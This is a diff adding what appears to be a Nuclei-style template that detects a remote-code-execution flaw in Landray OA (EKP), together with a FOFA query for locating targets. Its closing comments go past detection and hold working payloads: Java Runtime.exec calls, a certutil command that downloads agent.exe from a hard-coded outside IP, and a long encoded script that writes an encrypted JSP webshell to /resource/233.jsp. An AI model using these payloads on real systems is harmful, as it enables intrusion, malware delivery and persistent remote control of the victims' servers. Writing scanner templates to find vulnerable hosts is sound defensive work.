@@ -1,0 +1,47 @@
+id: landray-oa-datajson-js-rce
+
+info:
+  name: 深圳市蓝凌软件股份有限公司数字OA(EKP)存在RCE
+  author: nobody
+  severity: critical
+  description: 深圳市蓝凌软件股份有限公司数字OA(EKP)存在RCE,攻击者可利用漏洞获取敏感信息，可构造数据包进行RCE
+  reference:
+    - https://
+  tags: landray,oa,rce
+  metadata:
+    fofa-query : app='Landray-OA系统'
+
+http:
+  - raw: 
+      - |
+        GET /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=1&type=1 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+
+      - |
+        GET /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=*&type=1 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains((body_1), '模拟通过') && contains((body_1), 'fdId')"
+          - "status_code_2 == 200 && contains((body_2), '表达式发生错误') && contains((body_1), 'message')"
+        condition: and
+
+# ping dnslog: script=function%20test%28%29%7B%20return%20java.lang.Runtime%7D%3Br%3Dtest%28%29%3Br.getRuntime%28%29.exec%28%22ping%20abc.dnslog.cn%22%29
+# ping dnslog: script=var+calc='ping+abc.dnslog.cn';java.lang.Runtime.getRuntime().exec(calc)
+# 落地文件:     script=java.lang.Runtime.getRuntime().exec(%22certutil%20-urlcache%20-split%20-f%20http%3A%2F%2F43.154.73.79%3A8080%2Fagent.exe%20C%3A%5C%5CWindows%5C%5CTemp%5C%5Cagent.exe%22)%3B
+# 写webshell:  script=var%20cc%3D'%3C%25!%20String%20xc%3D%223c6e0b8a9c15224a%22%3B%20String%20pass%3D%22Thanks...520%22%3B%20String%20md5%3Dmd5(pass%2Bxc)%3B%20class%20X%20extends%20ClassLoader%7Bpublic%20X(ClassLoader%20z)%7Bsuper(z)%3B%7Dpublic%20Class%20Q(byte%5B%5D%20cb)%7Breturn%20super.defineClass(cb%2C%200%2C%20cb.length)%3B%7D%20%7Dpublic%20byte%5B%5D%20x(byte%5B%5D%20s%2Cboolean%20m)%7B%20try%7Bjavax.crypto.Cipher%20c%3Djavax.crypto.Cipher.getInstance(%22AES%22)%3Bc.init(m%3F1%3A2%2Cnew%20javax.crypto.spec.SecretKeySpec(xc.getBytes()%2C%22AES%22))%3Breturn%20c.doFinal(s)%3B%20%7Dcatch%20(Exception%20e)%7Breturn%20null%3B%20%7D%7D%20public%20static%20String%20md5(String%20s)%20%7BString%20ret%20%3D%20null%3Btry%20%7Bjava.security.MessageDigest%20m%3Bm%20%3D%20java.security.MessageDigest.getInstance(%22MD5%22)%3Bm.update(s.getBytes()%2C%200%2C%20s.length())%3Bret%20%3D%20new%20java.math.BigInteger(1%2C%20m.digest()).toString(16).toUpperCase()%3B%7D%20catch%20(Exception%20e)%20%7B%7Dreturn%20ret%3B%20%7D%20public%20static%20String%20base64Encode(byte%5B%5D%20bs)%20throws%20Exception%20%7BClass%20base64%3BString%20value%20%3D%20null%3Btry%20%7Bbase64%3DClass.forName(%22java.util.Base64%22)%3BObject%20Encoder%20%3D%20base64.getMethod(%22getEncoder%22%2C%20null).invoke(base64%2C%20null)%3Bvalue%20%3D%20(String)Encoder.getClass().getMethod(%22encodeToString%22%2C%20new%20Class%5B%5D%20%7B%20byte%5B%5D.class%20%7D).invoke(Encoder%2C%20new%20Object%5B%5D%20%7B%20bs%20%7D)%3B%7D%20catch%20(Exception%20e)%20%7Btry%20%7B%20base64%3DClass.forName(%22sun.misc.BASE64Encoder%22)%3B%20Object%20Encoder%20%3D%20base64.newInstance()%3B%20value%20%3D%20(String)Encoder.getClass().getMethod(%22encode%22%2C%20new%20Class%5B%5D%20%7B%20byte%5B%5D.class%20%7D).invoke(Encoder%2C%20new%20Object%5B%5D%20%7B%20bs%20%7D)%3B%7D%20catch%20(Exception%20e2)%20%7B%7D%7Dreturn%20value%3B%20%7D%20public%20static%20byte%5B%5D%20base64Decode(String%20bs)%20throws%20Exception%20%7BClass%20base64%3Bbyte%5B%5D%20value%20%3D%20null%3Btry%20%7Bbase64%3DClass.forName(%22java.util.Base64%22)%3BObject%20decoder%20%3D%20base64.getMethod(%22getDecoder%22%2C%20null).invoke(base64%2C%20null)%3Bvalue%20%3D%20(byte%5B%5D)decoder.getClass().getMethod(%22decode%22%2C%20new%20Class%5B%5D%20%7B%20String.class%20%7D).invoke(decoder%2C%20new%20Object%5B%5D%20%7B%20bs%20%7D)%3B%7D%20catch%20(Exception%20e)%20%7Btry%20%7B%20base64%3DClass.forName(%22sun.misc.BASE64Decoder%22)%3B%20Object%20decoder%20%3D%20base64.newInstance()%3B%20value%20%3D%20(byte%5B%5D)decoder.getClass().getMethod(%22decodeBuffer%22%2C%20new%20Class%5B%5D%20%7B%20String.class%20%7D).invoke(decoder%2C%20new%20Object%5B%5D%20%7B%20bs%20%7D)%3B%7D%20catch%20(Exception%20e2)%20%7B%7D%7Dreturn%20value%3B%20%7D%25%3E%3C%25try%7Bbyte%5B%5D%20data%3Dbase64Decode(request.getParameter(pass))%3Bdata%3Dx(data%2C%20false)%3Bif%20(session.getAttribute(%22payload%22)%3D%3Dnull)%7Bsession.setAttribute(%22payload%22%2Cnew%20X(this.getClass().getClassLoader()).Q(data))%3B%7Delse%7Brequest.setAttribute(%22parameters%22%2Cdata)%3Bjava.io.ByteArrayOutputStream%20arrOut%3Dnew%20java.io.ByteArrayOutputStream()%3BObject%20f%3D((Class)session.getAttribute(%22payload%22)).newInstance()%3Bf.equals(arrOut)%3Bf.equals(pageContext)%3Bresponse.getWriter().write(md5.substring(0%2C16))%3Bf.toString()%3Bresponse.getWriter().write(base64Encode(x(arrOut.toByteArray()%2C%20true)))%3Bresponse.getWriter().write(md5.substring(16))%3B%7D%20%7Dcatch%20(Exception%20e)%7B%7D%25%3E'%3Bvar%20home%3Djava.lang.System.getenv('CATALINA_HOME')%3Bvar%20f%3Dnew%20java.io.File(home)%3Bvar%20parent%3Df.getParent()%3Bvar%20child%3Dnew%20java.io.File(parent)%3Bvar%20p%3Dchild.getParent()%3Bvar%20ekp%3Dp%2B'%5C%5Cekp'%2B'%5C%5C'%2B'resource%5C%5C233.jsp'%3Bekp%3Bvar%20pw%3Dnew%20java.io.PrintWriter(ekp)%3Bpw.println(cc)%3Bpw.close()%3B
+
+# webshell目录: /resource/233.jsp
